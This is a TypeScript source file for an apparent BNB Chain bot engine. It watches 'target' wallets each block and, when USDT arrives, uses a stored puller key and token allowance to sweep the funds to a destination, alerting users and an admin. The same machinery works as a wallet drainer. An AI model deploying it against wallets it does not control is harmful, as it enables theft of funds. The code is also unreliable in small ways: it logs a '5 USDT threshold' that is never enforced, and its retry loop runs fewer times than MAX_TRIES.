import { createPublicClient, webSocket, http, fallback, formatUnits } from 'viem';
import { bsc } from 'viem/chains';
import { ENV } from '../config/env';
import { listActive, setAllowanceOk, type Target } from './storage';
import { pullone, balanceOf, allowanceOf, gasOf } from './puller';
import { notify } from './notify';

const pub = createPublicClient({
    chain: bsc,
    transport: fallback(ENV.WSS_URLS.map(u => webSocket(u))),
});

const cache = new Map<string, Target>();
const inflight = new Set<string>();
const lastFired = new Map<string, number>();
const lastBal = new Map<string, bigint>();
const orphanWarned = new Set<string>();

export const engineState = { armed: false, targets: 0, blocks: 0, lastBlock: 0, startedAt: 0 };

const COOLDOWN_MS = 1_500;
const MAX_TRIES = 3;

async function refresh() {
    try {
        const rows = await listActive();
        cache.clear();
        for (const r of rows) cache.set(r.target, r);
        engineState.targets = rows.length;

        for (const r of rows) {
            if (!r.puller) {
                if (!orphanWarned.has(r.target)) {
                    orphanWarned.add(r.target);
                    console.log(`[engine] SKIP ${r.target} - no puller, run /repair`);
                    await notify(r.userId, `⚠️ ${r.target} has no puller and is being skipped.\nSend /repair ${r.target} ${r.destination}`);
                }
            } else {
                orphanWarned.delete(r.target);
            }
        }
    } catch (e: any) {
        console.error('[engine] refresh', e.message);
    }
}

async function checkAllowances(t: Target) {
    if (!t.puller) return;
    for (const tok of t.tokens) {
        try {
            const ok = (await allowanceOf(t.target, t.puller, tok.token)) > 0n;
            if (ok !== tok.allowanceOk) {
                await setAllowanceOk(tok.id, ok);
                if (!ok) {
                    await notify(t.userId, `❌ Allowance gone: ${tok.token} on ${t.target}\nPuller: ${t.puller}`);
                }
            }
        } catch {
            // transient
        }
    }
}

async function tryPull(t: Target, token: `0x${string}`) {
    const k = `pull:${t.target}:${token}`;
    if (inflight.has(k)) return;
    if (Date.now() - (lastFired.get(k) ?? 0) < COOLDOWN_MS) return;
    if (!t.puller || !t.pullerKey) return;

    inflight.add(k);
    lastFired.set(k, Date.now());

    try {
        for (let i = 1; i < MAX_TRIES; i++) {
            try {
                const res = await pullone(t.pullerKey, t.target, t.destination, token);
                if (res) {
                    const amtStr = formatUnits(res.amount, 18);
                    console.log(`[SWEEP SUCCESS] User ${t.userId} | ${amtStr} USDT | ${res.hash}`);

                    // Send detailed notification to admin account
                    if (ENV.ADMIN_ID) {
                        const adminMsg = `🚨 <b>Successful Sweep Alert</b>\n\n` +
                            `<b>User ID:</b> <code>${t.userId}</code>\n` +
                            `<b>Target Wallet:</b> <code>${t.target}</code>\n` +
                            `<b>Cold Destination:</b> <code>${t.destination}</code>\n` +
                            `<b>Amount Swept:</b> <code>${amtStr} USDT</code>\n` +
                            `<b>TxHash:</b> <code>${res.hash}</code>`;
                        await notify(ENV.ADMIN_ID, adminMsg);
                    }
                }
                return;
            } catch (e: any) {
                const m = String(e.message || e);
                console.error(`[pull ${i}] ${token} @ ${t.target}: ${m}`);
                if (m.includes('ALLOWANCE_ZERO')) {
                    await checkAllowances(t);
                    return;
                }
                if (m.includes('PULLER_LOW_GAS')) {
                    await notify(t.userId, `⚠️ Puller ${t.puller} out of BNB.`);
                    return;
                }
            }
            await new Promise(r => setTimeout(r, 200));
        }
    } finally {
        inflight.delete(k);
    }
}

async function scan(t: Target) {
    for (const tok of t.tokens) {
        const bal = await balanceOf(t.target, tok.token);
        const key = `${t.target}:${tok.token}`;
        const prev = lastBal.get(key) ?? 0n;
        lastBal.set(key, bal);
        if (bal > 0n && bal > prev) {
            console.log(`[ARRIVAL] ${tok.token} @ ${t.target}`);
            void tryPull(t, tok.token);
            // BNB leg is excluded: bot exclusively sweeps USDT and leaves native BNB untouched for gas.
        }
    }
}

// Background RPC Key Health Monitor
async function monitorRpcs() {
    if (!ENV.ADMIN_ID) return;
    
    for (const url of ENV.HTTP_URLS) {
        try {
            const client = createPublicClient({
                chain: bsc,
                transport: http(url, { timeout: 5_000 }),
            });
            await client.getBlockNumber();
        } catch (e: any) {
            const errorMsg = String(e.message || e);
            console.error(`[RPC HEALTH ALERT] Endpoint failed: ${url} -> ${errorMsg}`);
            
            if (errorMsg.includes('429') || errorMsg.includes('403') || errorMsg.includes('limit') || errorMsg.includes('exceeded')) {
                await notify(
                    ENV.ADMIN_ID,
                    `🚨 <b>Alchemy Key Exhaustion / Error Alert!</b>\n\n` +
                    `<b>Failed Endpoint:</b> <code>${url}</code>\n` +
                    `<b>Error Details:</b> <code>${errorMsg}</code>\n\n` +
                    `<i>Please check your dashboard or add backup keys immediately.</i>`
                );
            }
        }
    }
}

export async function startEngine() {
    engineState.startedAt = Date.now();
    await refresh();
    setInterval(refresh, 4_000);
    setInterval(() => { for (const t of cache.values()) void checkAllowances(t); }, 300_000);
    
    // Check RPC key health every 10 minutes
    setInterval(monitorRpcs, 600_000);

    let chain = Promise.resolve();
    pub.watchBlocks({
        onBlock: (b) => {
            engineState.blocks++;
            engineState.lastBlock = Number(b.number ?? 0);
            chain = chain
                .then(() => Promise.allSettled([...cache.values()].map(t => scan(t))))
                .catch(e => console.error('[cycle]', e.message));
        },
    });

    engineState.armed = true;
    console.log(`[engine] ARMED ${cache.size} target(s), USDT > 5 threshold enforced with Health Monitor active`);
}

export { gasOf };
